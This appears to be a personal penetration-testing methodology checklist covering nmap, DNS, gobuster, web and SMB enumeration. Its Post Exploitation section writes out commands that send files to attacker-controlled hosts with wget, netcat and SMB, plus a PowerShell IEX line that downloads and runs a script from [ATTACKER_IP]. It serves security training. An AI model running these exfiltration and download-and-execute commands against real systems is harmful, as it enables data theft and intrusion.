# Methodology Checklist

Most assessments involve the following things:
- enumeration
	- identifying running services & the purpose of the target
	- re-enumerating services
	- finding software and hardware versions
	- searching for exploits in found versions
	- collecting credentials
- exploitation
- enumeration (again)
- persistence
- privilege escalation
- enumeration (again)
- persistence (again)

Enumeration is recursive. You may do initial enumeration, then re-enumerate what you've found, and this may happen several times before you do any exploitation.

Once you gain a foothold on a target somehow (i.e. remote code execution or remote access) you will have to re-enumerate. You will want to enumerate other users on the target or network, any new services that are only available locally, and any security flaws on the target now you have access to the file system and system information.

You may then wish to do any/all of the following:
- escalate to a user of higher privilege
- pivot to another network or host (lateral movement)
- exfiltrate data (passwords, audit logs, user information, database dumps)
- establish persistence on the host (remote access tools, rootkits, webshell backdoors)

# Flowchart

This flowchart provides a high-level overview of the steps involved:

![[Pasted image 20210628184558.png]]

## High Level Steps

- **Reconnaisance**
	- Network Discovery
		- Run DNS Enumeration on known domain names
		- Scan for live hosts within an IP range
	- Check [Shodan](https://www.shodan.io/) against target IP addresses
		- Google any exploits identified by Shodan
	- Nmap
		- Run standard scripts scan against top ports
		- All ports scan
		- UDP scan
		- OS Enumeration
			- Check operating system version for CVEs
		- Vulnerability scan on specific ports
- **Test services** found in Reconnaisance Stage
	- Interact with the service manually
	- Check [Hacktricks](https://book.hacktricks.xyz) for advice on penetration testing the service
	- Enumerate version numbers
		- In banners when connecting to the service
		- Using `nmap`'s suite of scripts
		- Infer from other hosts on network/operating system version/age of the target machine
	- Search version numbers in searchsploit (run `searchsploit -u` first)
	- Attempt to login to or register for the service
		- With known credentials
		- With default credentials
	- Fuzz the service with potential dangerous/unexpected input
	- If available, analyse code for the service
- **Identify an Exploit**
	- Check the exploit has no prerequisites (certain version numbers, authenticated access) that you have not met
	- Test locally if possible
	- What does the exploit do?
		- Leak information?
			- Use this information to further enumerate services
			- Use this information to log in to a service
		- Allow code execution?
			- Can you get a shell?
- **Gaining A Shell**
	- If you have code execution, try to get a shell on the system
		- Try multiple shell payloads
			- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
			- [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
			- [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
			- Try generating one with `msfvenom`
		- Try multiple languages
			- If the site runs on ASP, also try ASPX or JSP
		- Try well-known ports
- **Post Exploitation**
	- Re-enumeration
	- Privilege Escalation
	- Data Exfiltration
	- Persistence

# Enumeration

Enumeration is a wide topic, so this section contains a lot of detail on different stages and services.

## Initial Network Enumeration

Use this enumeration to do initial scans of the network - the hosts & services discovered can then be subsequently enumerated.

If you have both a domain and a public IP address, scan both - they may have different results, especially if the domain is protected by something like cloudflare.

Scan internal IP addresses with [[nmap]] if you have access to the internal network.

### Scan a Domain Name

Find an IP for a domain name using `host`:

```bash
$ host example.com
```

### Network Host Enumeration

Use these commands to discover hosts on a subnet.

#### Nmap Host Scan

Scan multiple targets on your subnet (assuming you are aware of a host with the IP address `a.b.c.d`):

```bash
$ nmap -sP -PI a.b.c.0/24
```

See [this Stack Exchange article](https://security.stackexchange.com/questions/36198/how-to-find-live-hosts-on-my-network) for more.

#### arp

Query ARP (Address Resolution Protocol) tables:

```bash
$ arp -a -n
```

#### IP

View your neighbours:

```bash
$ ip neigh
```

This is similar to the `arp -a -n` command, but is a nice alternative. See [this RedHat article](https://access.redhat.com/sites/default/files/attachments/rh_ip_command_cheatsheet_1214_jcs_print.pdf) for more.

### nmap

Use `nmap` to identify open ports on a specific host.

#### Standard Scan

With the `-v` flag to see as it's discovered:

```bash
$ mkdir nmap
$ nmap -sC -sV -v -oA nmap/target [IP/HOST]
```

Using `-Pn` if pings are blocked:

```bash
$ nmap -sC -sV -Pn -v -oA nmap/target [IP/HOST]
```

#### Full Port Scan

Do all 65535 ports:

```bash
$ nmap -p- -oA nmap/target-allports [IP/HOST]
```

Add a `sleep 300; ` to the start of this command to make it wait till your first `nmap` is done so you aren't running two scans at once. It's also worth waiting to see if your first scan requires the `-Pn` flag before running it.

With high speed:

```bash
$ nmap -p- --min-rate=10000 -oA nmap/target-allports [IP/HOST]
```

Autorecon verbose version:

```bash
$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oA nmap/verbose-allports [IP/HOST]
```

If you find new ports, rescan them:

```bash
$ nmap -p- --min-rate=10000 -oA nmap/[TARGET]-allports [TARGET]
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 08:20 BST
Nmap scan report for [TARGET]
Host is up (0.036s latency).
Not shown: 62461 filtered ports, 3069 closed ports
PORT      STATE SERVICE
...[old ports skipped out, new ports below]..
22022/tcp open  unknown
40893/tcp open  unknown
52221/tcp open  unknown
$ nmap -sC -sV -p 22022,40893,52221 -oA nmap/[TARGET]-newports [TARGET]
```

Search the version numbers returned against searchsploit if you get anything back.

#### OS Enumeration

Takes guesses at the operating system (requires root privileges):

```bash
$ sudo nmap -O -oA nmap/target-os [IP/HOST]
```

If SMB is running, you can use the `smb-os-discovery` script:

```bash
$ nmap --script smb-os-discovery [IP/HOST]
```

#### UDP

Scans common UDP Ports (requires root privileges):

```bash
$ sudo nmap -sU -oA nmap/target-udp [IP/HOST]
```

#### Vuln Scan

Will identify common vulnerabilities such as Eternal Blue and Heartbleed:

```bash
$ nmap --script vuln -oA nmap/target-vuln [IP/HOST]
```

### DNS Enumeration

#### Dig

Basic DNS lookup:

```bash
$ dig [IP/HOST]
```

Zone transfer (may expose more domains):

```bash
$ dig axfr [IP/HOST]
```

Supply the target itself as a DNS server if it's running DNS:

```bash
$ dig axfr [IP/HOST] @[IP/HOST]
```

## Enumerating Specific Services

If you find a service running on the target, and you haven't seen it before, search "Pentesting \[service\]" in Google - you will often find a hacktricks page.

## Automated Web Enumeration

Before running Gobuster, check [[Methodology Checklist#What Powers the Site|what powers the site]].

### Gobuster

#### Standard Scan

```bash
$ mkdir gobuster
$ gobuster dir -u http://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster/root
```

Make sure to use the extension you've found with `-x [extension]` when enumerating the site technologies.

Alternative list if running out of ideas:

```bash
$ gobuster dir -u http://[IP/DOMAIN]  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/root
```

With `-k` flag if need to ignore a bad cert:

```bash
$ gobuster dir -k -u https://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/root
```

### For Directories

This will find directories such as `/cgi-bin/` when looking for shellshock:

```bash
$ gobuster dir -f -u https://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/root
```

Then you can run a second scan recursively on the directories you've found.

## Manual Web Enumeration

When enumerating the site:
- check both HTTP and HTTPS versions
- check both IPs and domains

### Turn on Burp Suite

- Launch Burp
- Add a proxy in browser to `localhost:8080`
- View the traffic as it comes through
- Add rules to not intercept traffic to irrelevant domains (optional)

### View Site Source

Press `Ctrl + U` (on Firefox) to view the source, or right-click and view source.

Look for:
- comments (`<!-- -->`)
- references to files (scripts, images, directories) and their file extensions
- hidden elements (`display: none` etc)
- form elements

### Check robots.txt

Navigate to `/robots.txt` to check for any disallowed pages.

### What Powers the Site?

#### Checking Extensions

Try to visit the following:
- `index.html`
- `index.php`
- `index.asp`
- `index.aspx`
- `index.jsp`

Stop as soon as one of them loads.

#### Checking Site Headers

Use `curl` to read the `X-Powered-By` header:

```bash
$ curl -v [TARGET]
```

#### Wappalyser

[Wappalyser](https://www.wappalyzer.com/) is a browser extension that can be used to enumerate the tech stack running on the site. Install it from [here](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) (Firefox) or [here](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en) (Chrome).

Source is available [here](https://github.com/AliasIO/wappalyzer).

#### Searchsploit

Pass all discovered technologies and version numbers to `searchsploit` - e.g.

```bash
$ searchsploit -u #update
$ searchsploit term1 [term2] ... [termN]
```

Use flags such as `-e` for an exact match, `--exclude="term"` to not match certain terms.

### Identify Interactivity on Site

- Where can you supply user input?
- Can you register for an account?
	- Can you change any hidden fields to manipulate registration?
- Can you upload files?
	- Are there any restrictions on the file type? Are they server-side or client-side? See [[File Upload]]
- Are there any experiemental features, or things that are not fully implemented/under maintenance?
	- They may have weaker security
	- Look for beta, maintenance, development directories and subdomains

### Search History of Site

Has anything important or sensitive been removed?
- check google cache
- check archive.is
- check archive.org
- check wayback machine

### OSINT

Get a feel for the site or site owners' public profile:
- search the name of the company or site owner
	- do they have a github? could it have site source in it?
- find usernames on the site - run them through [nixintel.info](https://nixintel.info/)
- Run `exiftools` on images

## SMB Enumeration

### smbmap

Basic scan - may expose hostnames:

```bash
$ smbmap -H [HOST] -P [PORT]
```

Enumerate with null authentication:

```bash
$ smbmap -u null -p "" -H 10.10.10.40
```

Or with a specific user:

```bash
$ smbmap -u username -H 10.10.10.40
```

### smbclient

Connect to a server:

```bash
$ smbclient //[IP]
```

Connect to a specific share:

```bash
$ smbclient //[IP]/[SHARE]
```

Connect with null authentication:

```bash
$ smbclient -N //[IP]/[SHARE]
```

Use the `-L` flag to list shares:

```bash
$ smbclient -L hostname -U username
```

Once connected, use the following commands to enumerate files:
- `dir` to list files and directories
- `cd` to change directory
- `get` to download a file

# Post Exploitation

## File Transfer

See more at:
- [https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)
- [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
- [https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)
- [https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)

### Exfiltration

#### SCP

Host must be running SSH, and you must be authenticated.

On local box:

```bash
$ scp [user@][TARGET]:/path/to/target/file /local/path
```

See more at [[Fundamental Skills#Secure Copy]]

#### wget

Use a `wget` POST request if you have a fileserver that accepts posts. I [have one here](https://gist.github.com/Twigonometry/a619bc5234d39296737e8d00899f23af):

```bash
$ wget --post-file /path/to/file http://[LOCAL_IP]:[PORT]/
```

#### Netcat

On host:

```bash
$ nc -l -p [PORT] > /path/to/outfile
```

On target:

```bash
$ nc -w 3 [HOST_IP] [PORT] < /path/to/file
```

See more at [[netcat]]

#### SMB

Locally:

```bash
$ sudo impacket-smbserver share .
```

On target machine:

```bash
$ copy /path/to/file \\ATTACKER_IP\share\
```

### Upload Techniques

- HTTP (running a `python3 -m http.server` to serve files)
	- `wget` - `wget http://[ATTACKER_IP]/file -O /path/to/file`
	- `curl` - `curl http://[ATTACKER_IP]/file -o /path/to/file`
- SCP - on attacker machine, run `scp /path/to/target/file [user@][TARGET]:/target/path`
- FTP - upload to an FTP share and find where the files are stored (make sure you're in `binary` mode when uploading `.exe` files)
- Powershell `Invoke-WebRequest` (similar to `wget`) - `powershell.exe -command "Invoke-WebRequest http://[ATTACKER_IP]:[PORT]/file -o file`
- Powershell `IEX` (executes `.ps1` after downloading it) - `IEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/file.ps1')"`
- SMB Server
	- Run `sudo impacket-smbserver share .` locally
	- Run `copy \\[ATTACKER_IP\share\file`
- SMB Share - Upload to an SMB share and find where the files are stored

Windows writeable directories - write here if you can't write anywhere else:
- `%temp%`
- `\windows\system32\spool\drivers\color\`